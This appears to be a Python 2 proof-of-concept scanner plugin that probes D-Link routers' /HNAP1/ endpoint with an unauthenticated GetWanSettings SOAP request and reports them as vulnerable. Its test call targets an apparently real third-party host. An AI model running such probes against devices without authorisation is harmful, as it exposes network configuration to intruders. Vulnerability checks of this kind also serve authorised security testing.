from ..miniCurl import Curl
from ..t  import T
#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__author__ = '1c3z'
# ref:http://www.wooyun.org/bugs/wooyun-2014-066906
# ref:http://www.devttys0.com/2015/04/hacking-the-d-link-dir-890l/
# ref:http://www.freebuf.com/vuls/64521.html

import urlparse

class P(T):
    def __init__(self):
        T.__init__(self)
    def verify(self,head='',context='',ip='',port='',productname={},keywords='',hackinfo=''):
        arg='http://'+ip+':'+port+'/'
        curl=Curl()
        result = {}
        result['result']=False

        url = arg + "HNAP1/"
        header = 'SOAPAction: "http://purenetworks.com/HNAP1/GetWanSettings"'
        code, head, res, errcode, finalurl = curl.curl2(url,method='POST',header=header)
        if code == 200 and "xmlns:soap" in res:
            output("D_link /HANP1 unauthenticated remote query information " + url,result,'warning')
    

        del curl
        return result


def output(url,result,label):
    info = url + '  D_link  Vul '
    result['result']=True
    result['VerifyInfo'] = {}
    result['VerifyInfo']['type']='unauthenticated Vul'
    result['VerifyInfo']['URL'] =url
    result['VerifyInfo']['payload']='/root/github/poccreate/thirdparty/www/www_76489bff7719c8352136593b1ddf75b6.py'
    result['VerifyInfo']['level']=label
    result['VerifyInfo']['result'] =info

if __name__ == '__main__':
    print P().verify(ip='http://yunlai.cn:803/sfdsfds/',port='80')

#/root/github/poccreate/thirdparty/www/www_76489bff7719c8352136593b1ddf75b6.py
#/root/github/poccreate/codesrc/exp-687.py